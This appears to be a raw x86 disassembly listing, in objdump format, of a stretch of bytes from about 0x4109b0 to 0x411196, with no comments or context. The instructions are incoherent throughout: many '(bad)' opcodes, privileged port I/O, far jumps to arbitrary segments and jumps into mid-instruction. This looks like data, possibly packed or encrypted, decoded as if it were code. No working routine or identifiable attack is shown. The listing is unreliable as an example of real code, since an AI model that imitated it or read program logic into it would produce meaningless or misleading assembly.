  4109b0:	loop   0x4109d2
  4109b2:	lock je 0x410a1a
  4109b5:	cwde   
  4109b6:	lods   eax,DWORD PTR ds:[si]
  4109b8:	aas    
  4109b9:	and    BYTE PTR [edx-0x54150dd4],0x2
  4109c0:	fcmovnb st,st(7)
  4109c2:	sbb    al,0x1f
  4109c4:	mov    ds:0x877aadae,eax
  4109c9:	test   eax,0x2a853aef
  4109ce:	dec    BYTE PTR [edx+esi*8+0x58c546a]
  4109d5:	or     DWORD PTR [ecx-0x56],esi
  4109d8:	bound  esp,QWORD PTR [ecx-0x5b]
  4109db:	mov    dl,0x66
  4109dd:	adc    ebx,DWORD PTR [eax+0x6]
  4109e0:	inc    ecx
  4109e1:	xchg   esi,eax
  4109e2:	push   ecx
  4109e3:	mov    ecx,0xc10c831d
  4109e8:	and    eax,0x45ebeb98
  4109ed:	xchg   esp,eax
  4109ee:	(bad)  
  4109ef:	pop    edx
  4109f0:	sar    BYTE PTR [eax-0x3ad1c256],1
  4109f6:	arpl   ax,di
  4109f8:	mov    esp,0xffb8adf3
  4109fd:	and    eax,0x34752c8d
  410a02:	inc    esp
  410a03:	jno    0x4109c9
  410a05:	(bad)  
  410a06:	cli    
  410a07:	jg     0x410a13
  410a09:	push   ebx
  410a0a:	jne    0x410a38
  410a0c:	add    ebx,DWORD PTR [eax]
  410a0e:	dec    ebx
  410a0f:	scas   al,BYTE PTR es:[edi]
  410a10:	pop    edx
  410a11:	mov    ebx,0xe8b502be
  410a16:	mov    ebp,0xf33f25e7
  410a1b:	add    esi,DWORD PTR [ebx+ebp*4-0xde5432a]
  410a22:	cmp    esi,DWORD PTR [edx-0x3d]
  410a25:	inc    ebp
  410a26:	movsx  esi,WORD PTR [ebx-0x2c2dd28c]
  410a2d:	rcl    dh,cl
  410a2f:	or     BYTE PTR [ebx],al
  410a31:	and    al,0x90
  410a33:	nop
  410a34:	jb     0x410a15
  410a36:	int    0xc9
  410a38:	pop    ebp
  410a39:	loop   0x4109ea
  410a3b:	test   eax,0xb8bf9b5b
  410a40:	push   ss
  410a41:	inc    ebx
  410a42:	sti    
  410a43:	js     0x410aad
  410a45:	(bad)  
  410a46:	xor    DWORD PTR [edi-0x1ef49d6e],edx
  410a4c:	mov    edi,0xd467b267
  410a51:	cli    
  410a52:	dec    DWORD PTR [esi-0x22bb6003]
  410a58:	out    dx,eax
  410a59:	shl    dl,0x47
  410a5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a5d:	jmp    0x515b:0x650ac971
  410a64:	mov    ah,0xf1
  410a66:	and    DWORD PTR [edi+0x78a95dfc],eax
  410a6c:	ret    0xef07
  410a6f:	push   es
  410a70:	xchg   DWORD PTR [eax-0xd],edx
  410a73:	add    DWORD PTR ds:0xea213c5e,edi
  410a79:	in     al,dx
  410a7a:	mov    ds:0x9e3fc22d,eax
  410a7f:	push   DWORD PTR [edi+0x57]
  410a82:	sbb    edi,DWORD PTR [ebx-0x2d]
  410a85:	jecxz  0x410ae3
  410a87:	jne    0x410a73
  410a89:	outs   dx,BYTE PTR ds:[esi]
  410a8a:	jno    0x410a28
  410a8c:	popf   
  410a8d:	mov    ds,WORD PTR [eax+0x38a454d]
  410a93:	jbe    0x410aaf
  410a95:	ds fsubr st(0),st
  410a98:	enter  0xe9b2,0xe5
  410a9c:	arpl   ax,di
  410a9e:	inc    ebp
  410a9f:	stc    
  410aa0:	in     al,dx
  410aa1:	(bad)  
  410aa2:	clc    
  410aa3:	test   BYTE PTR ss:[eax-0x7d9b3af4],0x93
  410aab:	jecxz  0x410b16
  410aad:	xchg   BYTE PTR [eax+ebx*4-0x2f],cl
  410ab1:	jmp    0x29c88025
  410ab6:	lds    edi,FWORD PTR [ecx-0x72]
  410ab9:	scas   al,BYTE PTR es:[edi]
  410aba:	scas   eax,DWORD PTR es:[edi]
  410abb:	pushf  
  410abc:	mov    dh,0x63
  410abe:	div    BYTE PTR [ecx]
  410ac0:	pop    ds
  410ac1:	(bad)  
  410ac2:	enter  0xa461,0x5b
  410ac6:	cli    
  410ac7:	into   
  410ac8:	sub    eax,0x70e72b0d
  410acd:	es call 0xa49a4ff
  410ad3:	mov    BYTE PTR [eax],cl
  410ad5:	jbe    0x410a60
  410ad7:	pop    edi
  410ad8:	bsf    esp,ebx
  410adb:	(bad)  
  410adc:	imul   esp,DWORD PTR [ecx+0x40],0x1c77e3d5
  410ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ae4:	sub    eax,0x7af95b10
  410ae9:	pop    eax
  410aea:	jns    0x410abb
  410aec:	adc    eax,0x176442d
  410af1:	push   esp
  410af2:	xor    eax,0xe2839d97
  410af7:	add    eax,0xc2171013
  410afc:	aad    0x99
  410afe:	into   
  410aff:	mov    cl,0x1b
  410b01:	in     al,0xe7
  410b03:	ret    0x6397
  410b06:	or     BYTE PTR [edx+0x36],dl
  410b09:	aad    0x12
  410b0b:	shl    DWORD PTR [edi+0x5b],1
  410b0e:	jle    0x410b22
  410b10:	add    eax,0x431941
  410b15:	inc    esi
  410b16:	out    dx,eax
  410b17:	jbe    0x410ae8
  410b19:	call   0x1891:0x192ee49c
  410b20:	pop    ecx
  410b21:	daa    
  410b22:	in     eax,dx
  410b23:	adc    edx,0xffc28559
  410b29:	inc    ecx
  410b2a:	pop    ds
  410b2b:	push   cs
  410b2c:	out    dx,al
  410b2d:	sahf   
  410b2e:	(bad)  
  410b30:	xor    ebx,DWORD PTR [eax]
  410b32:	add    ecx,DWORD PTR [eax+0x4e2cea15]
  410b38:	call   0x76e:0xab108e97
  410b3f:	push   0xb2da8
  410b44:	in     eax,dx
  410b45:	fs cmp al,0xd0
  410b48:	jge    0x410bb5
  410b4a:	inc    esi
  410b4b:	ret    
  410b4c:	push   ebx
  410b4d:	pop    ebx
  410b4e:	enter  0xf098,0x80
  410b52:	sbb    DWORD PTR [ebp+0x2d],ecx
  410b55:	fiadd  DWORD PTR [ebx]
  410b57:	mov    eax,ds:0x832161c
  410b5c:	jl     0x410bbe
  410b5e:	sbb    BYTE PTR [esi],0x8e
  410b61:	rcl    ah,0x7f
  410b64:	mov    BYTE PTR [eax-0x29e9cfb],cl
  410b6a:	inc    esp
  410b6b:	cmp    al,0x64
  410b6d:	fldenv [edx]
  410b6f:	cmp    esp,DWORD PTR [ebx-0x2b1f27b0]
  410b75:	and    al,0x1e
  410b77:	ror    BYTE PTR [ebx-0x4b],1
  410b7a:	stc    
  410b7b:	fsub   DWORD PTR [ebx-0x4f]
  410b7e:	arpl   WORD PTR [edi],cx
  410b80:	lock test BYTE PTR [edx-0x767914a3],ch
  410b87:	inc    edx
  410b88:	fild   DWORD PTR [edx+ebp*1]
  410b8b:	out    0x12,eax
  410b8d:	xchg   edi,eax
  410b8e:	dec    ebp
  410b8f:	ja     0x410b98
  410b91:	repz inc ebx
  410b93:	(bad)  
  410b94:	or     BYTE PTR [ebx],dh
  410b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b97:	pushf  
  410b98:	ret    0x626b
  410b9b:	femms  
  410b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b9e:	mov    cl,0x23
  410ba0:	mov    ebx,0xfdfe86b0
  410ba5:	fadd   st,st(1)
  410ba7:	sbb    al,0x79
  410ba9:	mov    ds:0xf4679bca,eax
  410bae:	inc    ecx
  410baf:	ret    0xc651
  410bb2:	ds aas 
  410bb4:	cmp    bh,BYTE PTR [edx]
  410bb6:	mov    ch,0x16
  410bb8:	jle    0x410bce
  410bba:	and    bh,BYTE PTR [eax]
  410bbc:	fs ret 0xcd26
  410bc0:	adc    eax,0x8e71e3ce
  410bc5:	pop    esi
  410bc6:	fisttp DWORD PTR [edx+ebp*8+0x5432b0da]
  410bcd:	push   cs
  410bce:	jmp    0x410bb7
  410bd0:	mov    ah,al
  410bd2:	dec    esp
  410bd3:	dec    esi
  410bd4:	jmp    0x69f8c71c
  410bd9:	jg     0x410b7b
  410bdb:	sub    al,dl
  410bdd:	pop    eax
  410bde:	scas   al,BYTE PTR es:[edi]
  410bdf:	sbb    DWORD PTR [eax],ebx
  410be1:	dec    ebx
  410be2:	outs   dx,DWORD PTR ds:[esi]
  410be3:	cmp    al,0x4f
  410be5:	mov    dl,0xe9
  410be7:	xchg   ebp,eax
  410be8:	fdivr  DWORD PTR [ebx+0x60e1fdd6]
  410bee:	cdq    
  410bef:	aad    0xb4
  410bf1:	inc    ebx
  410bf2:	mov    ebx,DWORD PTR [edi+0x6e4728a6]
  410bf8:	dec    esi
  410bf9:	dec    esp
  410bfa:	retf   
  410bfb:	adc    DWORD PTR [esi-0x3b],0x468a56f3
  410c02:	inc    ebx
  410c03:	ins    DWORD PTR es:[edi],dx
  410c04:	dec    ebp
  410c05:	jl     0x410ba5
  410c07:	push   esp
  410c08:	mov    ah,0x20
  410c0a:	pop    es
  410c0b:	ffree  st(4)
  410c0d:	fnstcw WORD PTR [edi+0x7a127d5d]
  410c13:	sbb    eax,0xbf69a32f
  410c18:	(bad)  
  410c19:	fist   DWORD PTR [esi+ebx*4+0x4d]
  410c1d:	and    ebp,DWORD PTR [edx+eiz*4]
  410c20:	int    0x17
  410c22:	and    esi,DWORD PTR [ebp+0x75]
  410c25:	jp     0x410c38
  410c27:	dec    ebx
  410c28:	test   eax,0x27a61e31
  410c2d:	jmp    0x716bfd6d
  410c32:	cmp    DWORD PTR [edx-0x3c],ebx
  410c35:	xchg   ebp,eax
  410c36:	test   al,0x65
  410c38:	sub    al,0x24
  410c3a:	mov    ds:0xabce0f89,eax
  410c3f:	into   
  410c40:	mov    edi,0x26681730
  410c45:	cs pop edx
  410c47:	es hlt 
  410c49:	mov    ch,0xd3
  410c4b:	pop    ecx
  410c4c:	cdq    
  410c4d:	addr16 pop ecx
  410c4f:	cmc    
  410c50:	xor    ah,BYTE PTR [esi-0x60fe52b4]
  410c56:	push   edi
  410c57:	rcl    edx,0xb3
  410c5a:	ins    BYTE PTR es:[edi],dx
  410c5b:	repz aas 
  410c5d:	fldenv [ebx+0x5bb020e]
  410c63:	cmp    DWORD PTR [ebx+0x1b],ebx
  410c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c67:	xchg   ebx,eax
  410c68:	shr    BYTE PTR [ebx+0x54],0xd
  410c6c:	ss mov eax,0x6e983f06
  410c72:	sti    
  410c73:	mov    esi,0xec41fc87
  410c78:	loopne 0x410c69
  410c7a:	mov    ds:0xcf72a499,eax
  410c7f:	in     al,dx
  410c80:	xchg   DWORD PTR [edx+eax*2-0x33bd0492],esp
  410c87:	xchg   esi,eax
  410c88:	fldcw  WORD PTR [edi+ecx*8]
  410c8b:	clc    
  410c8c:	mov    BYTE PTR [ecx+0x72938cad],bl
  410c92:	rcl    DWORD PTR [eax-0x24448ee0],1
  410c98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c99:	aas    
  410c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c9b:	mov    ds:0xc5c807a8,al
  410ca0:	inc    BYTE PTR ds:0xc72ba6f
  410ca6:	loope  0x410ca7
  410ca8:	lock ins BYTE PTR es:[edi],dx
  410caa:	aaa    
  410cab:	or     ah,bl
  410cad:	jg     0x410cad
  410caf:	push   esi
  410cb0:	dec    ebp
  410cb1:	sub    BYTE PTR [edx+0x5bfbba4a],ah
  410cb7:	rcr    WORD PTR [esp+ebp*1+0x21d9c724],1
  410cbf:	dec    esi
  410cc0:	dec    ebx
  410cc1:	jmp    0x9faccc77
  410cc6:	pop    ebx
  410cc7:	lea    esi,[edx-0x2351b244]
  410ccd:	push   edi
  410cce:	or     edi,0x62d13db9
  410cd4:	and    bh,BYTE PTR [eax-0x52]
  410cd7:	xor    dh,BYTE PTR [esi-0x3c]
  410cda:	pop    ebp
  410cdb:	add    eax,0x1a829b6a
  410ce0:	daa    
  410ce1:	fist   DWORD PTR [edx-0x56028279]
  410ce7:	ret    0xcdcf
  410cea:	jo     0x410ca0
  410cec:	jecxz  0x410ce6
  410cee:	and    al,0x5e
  410cf0:	mov    ecx,0xbfe49daf
  410cf5:	xchg   esp,eax
  410cf6:	push   0x5d
  410cf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cf9:	call   0xf517:0xaabd1be
  410d00:	sbb    ecx,ebx
  410d02:	sbb    DWORD PTR [eax],ebp
  410d04:	fnstcw WORD PTR [edx-0x70]
  410d07:	jno    0x410cac
  410d09:	push   ds
  410d0a:	add    bh,bl
  410d0c:	jo     0x410cb8
  410d0e:	into   
  410d0f:	into   
  410d10:	div    DWORD PTR [ecx-0x7d]
  410d13:	pop    ecx
  410d14:	sbb    eax,DWORD PTR [ebp+edx*8+0x57]
  410d18:	popa   
  410d19:	leave  
  410d1a:	pop    ebx
  410d1b:	repz adc eax,ecx
  410d1e:	push   eax
  410d1f:	hlt    
  410d20:	in     al,0x3a
  410d22:	or     dh,BYTE PTR [edx+0xcdbc1b7]
  410d28:	dec    edx
  410d29:	mov    edi,0x108c2680
  410d2e:	cmp    eax,0xdb1436a6
  410d33:	call   0x84c5a68e
  410d38:	dec    esp
  410d39:	jbe    0x410ce0
  410d3b:	xor    eax,DWORD PTR ds:0xc10fb177
  410d41:	sub    dl,0x12
  410d44:	jmp    0x7edb:0xc2a3a801
  410d4b:	inc    ebp
  410d4c:	pop    edi
  410d4d:	add    esp,DWORD PTR [ebx+0x366ed0f1]
  410d53:	pop    ebp
  410d54:	and    eax,0x57cbb52
  410d59:	jbe    0x410da6
  410d5b:	adc    eax,0x8ede1bce
  410d60:	dec    edx
  410d61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d62:	jge    0x410d29
  410d64:	out    0xf4,al
  410d66:	int    0x9f
  410d68:	mov    al,0xb6
  410d6a:	jns    0x410cf3
  410d6c:	adc    esi,DWORD PTR [eax+0x34]
  410d6f:	mov    BYTE PTR [eax-0x63],bl
  410d72:	add    bh,BYTE PTR [eax-0x1a8e1c90]
  410d78:	retf   
  410d79:	sahf   
  410d7a:	dec    ebx
  410d7b:	neg    BYTE PTR [ebp+0x598ad4b]
  410d81:	test   al,0x3a
  410d83:	sub    dh,ch
  410d85:	dec    esi
  410d86:	scas   al,BYTE PTR es:[edi]
  410d87:	xchg   BYTE PTR [edi+ecx*8],al
  410d8a:	jg     0x410e06
  410d8c:	bnd call 0x8b16dbb9
  410d92:	mov    eax,0x741c1ac6
  410d97:	jl     0x410d5a
  410d99:	ins    DWORD PTR es:[edi],dx
  410d9a:	pop    esp
  410d9b:	(bad)  
  410d9c:	loope  0x410d83
  410d9e:	stc    
  410d9f:	mov    dh,0x77
  410da1:	dec    esp
  410da2:	mov    esp,0xb9959b1e
  410da7:	lahf   
  410da8:	jl     0x410e09
  410daa:	into   
  410dab:	push   edx
  410dac:	in     eax,0x4
  410dae:	push   ecx
  410daf:	enter  0x4529,0x99
  410db3:	fs mov ecx,0x5e4c95eb
  410db9:	fsub   DWORD PTR [ebx-0x6e]
  410dbc:	and    ah,ah
  410dbe:	jle    0x410d7a
  410dc0:	cmc    
  410dc1:	aad    0x31
  410dc3:	sub    ecx,DWORD PTR [esi]
  410dc5:	mov    ch,BYTE PTR [edi-0x339db0de]
  410dcb:	lds    ebx,FWORD PTR [ecx]
  410dcd:	(bad)  
  410dcf:	ds pop esi
  410dd1:	in     eax,0xc
  410dd3:	outs   dx,BYTE PTR ds:[esi]
  410dd4:	addr16 cs xchg edx,eax
  410dd7:	push   ebp
  410dd8:	(bad)  
  410dd9:	aaa    
  410dda:	jns    0x410d68
  410ddc:	aam    0xed
  410dde:	push   edx
  410ddf:	cwde   
  410de0:	sbb    eax,eax
  410de2:	jne    0x410dce
  410de4:	leave  
  410de5:	xchg   BYTE PTR [edx+0x6],al
  410de8:	pop    ecx
  410de9:	or     al,0x41
  410deb:	shr    DWORD PTR [edx-0x2b],cl
  410dee:	add    al,0x26
  410df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410df1:	lock sbb al,0x51
  410df4:	dec    ebx
  410df5:	sbb    BYTE PTR [edi+0x6a984a8d],0x7d
  410dfc:	xchg   esp,eax
  410dfd:	xchg   BYTE PTR [eax],dh
  410dff:	test   eax,0x513d99b5
  410e04:	imul   eax,DWORD PTR [eax+edi*4-0x78fd3bf0],0x4c61f558
  410e0f:	lods   eax,DWORD PTR ds:[esi]
  410e10:	push   0x3dd92bb1
  410e15:	cmp    BYTE PTR [ebx],al
  410e17:	add    eax,0x92bf836d
  410e1c:	out    0xff,al
  410e1e:	jmp    0xb4556734
  410e23:	aad    0xbe
  410e25:	mov    ecx,0x80c04a33
  410e2a:	sbb    DWORD PTR [esi],ebp
  410e2c:	or     eax,0xf369c2d6
  410e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e32:	sub    DWORD PTR [edi],ebp
  410e34:	test   eax,0xa57033db
  410e39:	out    dx,al
  410e3a:	bound  edi,QWORD PTR [esi]
  410e3c:	push   edi
  410e3d:	push   edi
  410e3e:	mov    ah,0x86
  410e40:	lock mov ebp,0xcbb4f2bc
  410e46:	(bad)  
  410e47:	cmc    
  410e48:	and    al,0x8e
  410e4a:	push   0x8c068fa5
  410e4f:	and    dl,BYTE PTR [ebp+ebx*1-0x60776191]
  410e56:	hlt    
  410e57:	cmp    BYTE PTR [ebp+0x46],bl
  410e5a:	jo     0x410e2e
  410e5c:	or     ebx,esp
  410e5e:	in     al,0x84
  410e60:	or     edx,DWORD PTR [ebx-0x3]
  410e63:	std    
  410e64:	retf   0xf310
  410e67:	ins    DWORD PTR es:[edi],dx
  410e68:	retf   0xc402
  410e6b:	inc    edi
  410e6c:	push   edi
  410e6d:	xor    ebx,DWORD PTR [ebx+ecx*4-0x2e]
  410e71:	mov    dh,0x2a
  410e73:	mov    ds:0x420bbcac,al
  410e78:	outs   dx,DWORD PTR ds:[esi]
  410e79:	sub    eax,0x567d8659
  410e7e:	or     eax,0xeacf8bfc
  410e83:	xchg   esp,eax
  410e84:	les    ebp,FWORD PTR [eax]
  410e86:	inc    esp
  410e87:	call   0xbe9f5e4d
  410e8c:	cmp    bh,ah
  410e8e:	mov    eax,ds:0xc589b9e8
  410e93:	popa   
  410e94:	into   
  410e95:	fcomp  DWORD PTR [edi]
  410e97:	sub    cl,BYTE PTR [ebx]
  410e99:	sbb    BYTE PTR [ecx-0x1e],ah
  410e9c:	pop    esi
  410e9d:	out    dx,al
  410e9e:	mov    ah,0x58
  410ea0:	rol    BYTE PTR ds:0x5cbf7e5d,1
  410ea6:	das    
  410ea7:	enter  0x711c,0x37
  410eab:	lahf   
  410eac:	cmp    BYTE PTR [eax+0x77a43202],0x88
  410eb3:	sbb    al,0x72
  410eb5:	jne    0x410f05
  410eb7:	ret    0x7fa8
  410eba:	rcl    cl,1
  410ebc:	jg     0x410e68
  410ebe:	jno    0x410ecb
  410ec0:	mov    esi,0xff3b1372
  410ec5:	and    ecx,DWORD PTR cs:[edx+0x2f331b71]
  410ecc:	or     DWORD PTR [eax-0x1decc3ba],ecx
  410ed2:	xor    BYTE PTR [esp+ebp*8+0x4b0f3040],ah
  410ed9:	out    dx,eax
  410eda:	aad    0x6e
  410edc:	(bad)  
  410edd:	aas    
  410ede:	lds    edx,FWORD PTR [ebx-0xf]
  410ee1:	clc    
  410ee2:	test   al,0xd4
  410ee5:	out    0x7e,al
  410ee7:	pusha  
  410ee8:	sub    cl,ch
  410eea:	cmp    ebx,DWORD PTR [esi+0x36]
  410eed:	jne    0x410f65
  410eef:	pop    ebp
  410ef0:	sar    esp,1
  410ef2:	aas    
  410ef3:	mov    al,ds:0xb5c6224a
  410ef8:	jbe    0x410ebb
  410efa:	mov    al,ds:0x90df61e3
  410eff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f00:	cwde   
  410f01:	add    BYTE PTR [ecx],0xab
  410f04:	iret   
  410f05:	inc    ecx
  410f06:	fisttp WORD PTR [ebp+0x34029bf5]
  410f0c:	inc    edi
  410f0d:	add    BYTE PTR [ebx],0x6c
  410f10:	mov    edi,0x4c9e3178
  410f15:	cmp    esp,DWORD PTR [edi]
  410f17:	push   es
  410f18:	pushf  
  410f19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f1a:	inc    edi
  410f1b:	add    ch,ah
  410f1d:	cwde   
  410f1e:	fs in  eax,0xa7
  410f21:	dec    ebp
  410f22:	call   0xfebaa0c4
  410f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f28:	scas   eax,DWORD PTR es:[edi]
  410f29:	mov    ss,WORD PTR [eax]
  410f2b:	outs   dx,BYTE PTR ds:[esi]
  410f2c:	mov    dh,ah
  410f2e:	rcl    ch,cl
  410f30:	push   esp
  410f31:	xchg   edx,eax
  410f32:	cli    
  410f33:	test   eax,0xa9a10075
  410f38:	pop    esp
  410f39:	sti    
  410f3a:	out    dx,eax
  410f3b:	push   ebx
  410f3c:	add    BYTE PTR [ebx+0x31],ah
  410f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f40:	xchg   BYTE PTR [ebp-0x70],ah
  410f43:	push   ss
  410f44:	jp     0x410fb3
  410f46:	jmp    0x67408efa
  410f4b:	xchg   ebp,eax
  410f4c:	dec    ebx
  410f4d:	jl     0x410f9d
  410f4f:	loopne 0x410f0f
  410f51:	mov    WORD PTR [ebp+0x74],ds
  410f54:	inc    eax
  410f55:	loope  0x410fac
  410f57:	add    eax,0x1312712
  410f5c:	sar    DWORD PTR [edi+0x223990b0],0x59
  410f63:	and    esp,eax
  410f65:	mov    edi,edx
  410f67:	xor    eax,0x83ee8ec3
  410f6c:	shl    DWORD PTR [edi+0x7e8a6efe],cl
  410f72:	ja     0x410f78
  410f74:	(bad)  [esp+ebp*4-0x7e409969]
  410f7b:	std    
  410f7c:	and    BYTE PTR [edx],bh
  410f7e:	pop    esi
  410f7f:	push   ss
  410f80:	cwde   
  410f81:	mov    eax,ds:0xa66e6037
  410f86:	repz dec edx
  410f88:	add    ecx,edi
  410f8a:	in     al,dx
  410f8b:	frstor [ecx-0x3699c198]
  410f91:	dec    ebp
  410f92:	sti    
  410f93:	mov    ?,WORD PTR [ebx+0x2b]
  410f96:	mov    esp,0xd816ec76
  410f9b:	outs   dx,DWORD PTR ds:[esi]
  410f9c:	bnd jp 0x411003
  410f9f:	out    dx,al
  410fa0:	mov    eax,0x2c0312d4
  410fa5:	inc    edx
  410fa6:	sub    eax,0x795e241d
  410fab:	dec    eax
  410fac:	sbb    al,0xa2
  410fae:	stc    
  410faf:	iret   
  410fb0:	fisttp DWORD PTR [ecx+0x4c919994]
  410fb6:	dec    esi
  410fb7:	es dec esi
  410fb9:	in     al,0x4e
  410fbb:	aas    
  410fbc:	jge    0x410fc4
  410fbe:	push   edi
  410fbf:	cmp    al,0xf6
  410fc1:	adc    bl,0x71
  410fc4:	or     edx,esi
  410fc6:	mov    al,0x6d
  410fc8:	adc    esp,DWORD PTR ds:0xe9b9d8bc
  410fce:	imul   ecx,DWORD PTR [eax-0x2f],0x6e
  410fd2:	cdq    
  410fd3:	and    BYTE PTR ds:0xf5c50733,ch
  410fd9:	and    ebx,edx
  410fdb:	sub    eax,0x987b7b40
  410fe0:	adc    esp,ebp
  410fe2:	fcmovb st,st(4)
  410fe4:	xchg   ebp,eax
  410fe5:	push   ebp
  410fe6:	mov    ebp,0x76e01a51
  410feb:	sbb    ebp,DWORD PTR [ecx+0x76]
  410fee:	fcmovnu st,st(2)
  410ff0:	mov    ds:0x5c61b0cc,eax
  410ff5:	fwait
  410ff6:	jae    0x41100e
  410ff8:	cs pop es
  410ffa:	popa   
  410ffb:	jecxz  0x410f9c
  410ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ffe:	push   esi
  410fff:	cli    
  411000:	dec    edi
  411001:	js     0x41103e
  411003:	sub    al,BYTE PTR [esi+eiz*1+0x6e400e86]
  41100a:	adc    ebp,edx
  41100c:	es leave 
  41100e:	ficomp WORD PTR [esi]
  411010:	cwde   
  411011:	push   es
  411012:	mov    esi,0x2a04798e
  411017:	inc    edx
  411018:	mov    edi,0x9eda48de
  41101d:	stc    
  41101e:	or     ch,bh
  411020:	mov    WORD PTR [edx],cs
  411022:	pop    es
  411023:	xchg   DWORD PTR [ecx],ebx
  411025:	or     DWORD PTR ds:0x542c7742,ebp
  41102b:	aam    0xa1
  41102d:	fsubr  QWORD PTR [edi-0x58]
  411030:	jo     0x410ff8
  411032:	inc    esi
  411033:	ficom  DWORD PTR [edi+edi*8+0x75]
  411037:	(bad)  
  411038:	dec    edx
  411039:	push   eax
  41103a:	lds    eax,FWORD PTR [ebx+0x3d]
  41103d:	push   0x66
  41103f:	cwde   
  411040:	fiadd  WORD PTR [edi-0x5a]
  411043:	push   ds
  411044:	imul   esp,DWORD PTR [ecx+0x636202cd],0xe2ca24b
  41104e:	(bad)  
  41104f:	pop    ss
  411050:	ds xchg ebp,eax
  411052:	mov    eax,0x108165c
  411057:	mov    edi,0xa4ba52b8
  41105c:	hlt    
  41105d:	sbb    ecx,DWORD PTR [ebx-0x13]
  411060:	mov    bh,0xf5
  411062:	jmp    0x4110e3
  411064:	out    0x93,eax
  411066:	dec    ebp
  411067:	fist   WORD PTR [edi+0x11]
  41106a:	cmp    eax,0xe3346bc0
  41106f:	xor    al,0x6c
  411071:	dec    ebp
  411072:	addr16 add al,0xf6
  411075:	sbb    al,0x78
  411077:	push   0x17ef703d
  41107c:	or     dh,cl
  41107e:	jmp    0x540c:0x264bcaec
  411085:	mov    DWORD PTR [edi-0x13],ebx
  411088:	sbb    ah,0x68
  41108b:	fcomp  DWORD PTR [edx+0x75c6e4e0]
  411091:	inc    eax
  411092:	pusha  
  411093:	dec    ebx
  411094:	adc    ch,BYTE PTR [eax+0x60529cf9]
  41109a:	call   0x1cec30a7
  41109f:	retf   
  4110a0:	into   
  4110a1:	lea    esi,[eax-0x4a]
  4110a4:	cwde   
  4110a5:	inc    edi
  4110a6:	pop    ebx
  4110a7:	push   es
  4110a8:	dec    edi
  4110a9:	pop    es
  4110aa:	cdq    
  4110ab:	std    
  4110ac:	pushf  
  4110ad:	cwde   
  4110ae:	mov    ch,0xae
  4110b0:	std    
  4110b1:	pop    es
  4110b2:	xor    al,0x89
  4110b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110b5:	test   al,0x16
  4110b7:	fiadd  WORD PTR [esi]
  4110b9:	inc    ebp
  4110ba:	or     ch,bh
  4110bc:	sahf   
  4110bd:	sub    al,0xb
  4110bf:	cmp    al,0xc9
  4110c1:	dec    esp
  4110c2:	dec    ebx
  4110c3:	repnz mov ch,0x1a
  4110c6:	cmp    dh,dh
  4110c8:	sbb    al,0x29
  4110ca:	sub    eax,0x962cebaf
  4110cf:	jecxz  0x411135
  4110d1:	inc    ebp
  4110d2:	loop   0x411118
  4110d4:	dec    eax
  4110d5:	push   ebx
  4110d6:	adc    DWORD PTR [esi-0x7627c154],esp
  4110dc:	call   0xb3abc132
  4110e1:	retf   0x847
  4110e4:	rcl    bl,1
  4110e6:	cli    
  4110e7:	mov    ds:0x27a13968,eax
  4110ec:	cmp    ch,BYTE PTR [ecx+0x22]
  4110ef:	push   eax
  4110f0:	sub    al,BYTE PTR [edi+0x6e]
  4110f3:	pushf  
  4110f4:	out    0xfb,al
  4110f6:	fisub  WORD PTR [eax+0x3c780515]
  4110fc:	aas    
  4110fd:	loope  0x4110d4
  4110ff:	imul   esp,esp,0x6e636f4c
  411105:	retf   0xa7a8
  411108:	sub    ch,BYTE PTR [ebx]
  41110a:	jle    0x5df432a4
  411110:	mov    esp,0x856965ed
  411115:	fild   WORD PTR [edx]
  411117:	jb     0x411144
  411119:	stc    
  41111a:	shl    BYTE PTR [ebp+0x1e],0xb3
  41111e:	sbb    eax,0x88db100
  411123:	xchg   ebp,eax
  411124:	sub    al,BYTE PTR gs:[ebp+esi*1+0x509bbc2b]
  41112c:	xchg   edx,eax
  41112d:	popf   
  41112e:	out    0x8f,al
  411130:	(bad)  
  411131:	stos   DWORD PTR es:[edi],eax
  411132:	je     0x411185
  411134:	rcl    BYTE PTR [ecx-0x400ee71e],cl
  41113a:	and    dh,dl
  41113c:	xchg   ebp,eax
  41113d:	adc    DWORD PTR [edx-0x74155e9c],eax
  411143:	addr16 inc ecx
  411145:	mov    bl,0xf0
  411147:	aam    0x3f
  411149:	ficomp WORD PTR [edi+0x753536ec]
  41114f:	imul   BYTE PTR [ecx]
  411151:	push   ecx
  411152:	dec    ecx
  411153:	sub    BYTE PTR [edi],bl
  411155:	pop    ebx
  411156:	xchg   ecx,eax
  411157:	adc    ebp,DWORD PTR [edi-0x20]
  41115a:	mov    ch,0xd0
  41115c:	xlat   BYTE PTR ds:[ebx]
  41115d:	out    dx,al
  41115e:	shl    BYTE PTR [ebp-0x6034cc77],1
  411164:	pop    esp
  411165:	xor    DWORD PTR [ebp-0x2a],ebx
  411168:	test   eax,0xe63d53ba
  41116d:	push   es
  41116e:	imul   esi,DWORD PTR [edi],0xa1112690
  411174:	retf   
  411175:	pop    ecx
  411176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411177:	mov    al,0xe6
  411179:	push   ebp
  41117a:	lods   eax,DWORD PTR ds:[esi]
  41117b:	(bad)  
  41117e:	fild   WORD PTR [eax-0x66]
  411181:	pop    es
  411182:	ds lock xchg esp,eax
  411185:	and    bl,bh
  411187:	jbe    0x4111e3
  411189:	inc    esp
  41118a:	pop    es
  41118b:	sti    
  41118c:	cmp    cl,BYTE PTR ds:0xed4aacfd
  411192:	and    DWORD PTR [edi+edx*8+0x43],esi
  411196:	inc    esi
